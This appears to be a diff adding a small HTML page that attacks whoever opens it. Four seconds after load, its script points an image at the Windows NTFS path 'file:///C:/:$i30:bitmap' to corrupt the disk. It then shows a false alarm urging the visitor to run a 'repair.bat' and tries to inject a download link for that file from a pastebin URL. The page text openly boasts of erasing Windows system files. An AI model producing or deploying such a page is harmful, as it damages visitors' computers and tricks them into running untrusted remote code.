@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Example</title>
+        <script>
+        	// sleep time expects milliseconds
+          function sleep (time) {
+            return new Promise((resolve) => setTimeout(resolve, time));
+          }
+
+          // Usage!
+          sleep(4000).then(() => {
+              document.getElementById("crasher").src="file:///C:/:$i30:bitmap";
+
+              alert("This tab may have damaged your computer. Please run the repair script in downloads to repair and triage your system.")
+              document.body.innerHtml += "<a href=\"https://pastebin.com/raw/dyqUCbk5\" download=\"repair.bat\">"
+          });
+        </script>
+    </head>
+    <body>
+        <h1>Please stay on this website while we erase critical Windows 10 system files.</h1>
+        <br>
+        <img id="crasher" src="https://pbs.twimg.com/profile_images/1098590569327140869/n4go6XXt.jpg" width="100%" height="70%">
+    </body>
+</html>
